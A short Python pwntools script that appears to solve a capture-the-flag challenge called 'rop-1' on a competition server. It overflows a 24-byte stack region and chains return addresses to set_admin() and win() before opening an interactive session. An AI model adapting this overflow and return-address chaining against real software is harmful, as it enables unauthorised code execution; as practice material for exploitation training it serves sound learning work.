from pwn import *

context.log_level = "debug"
context.arch = 'amd64'

# For local testing:
# io = process('./rop-1')
# Connect to the remote server:
io = remote("skillsusa.cybr.club", 443, ssl=True, sni="rop-1")


set_admin_addr = 0x00000000004011d3
win_addr = 0x00000000004011f0

print(f"set_admin() at {set_admin_addr}")
print(f"win() at {win_addr}")

io.recvuntil(b"Enter a message:")


payload = b"A" * 24  # 16 bytes buffer + 8 bytes for saved RBP
payload += p64(set_admin_addr)  # Call set_admin() first
payload += p64(win_addr)        # Then call win()

io.sendline(payload)

io.interactive()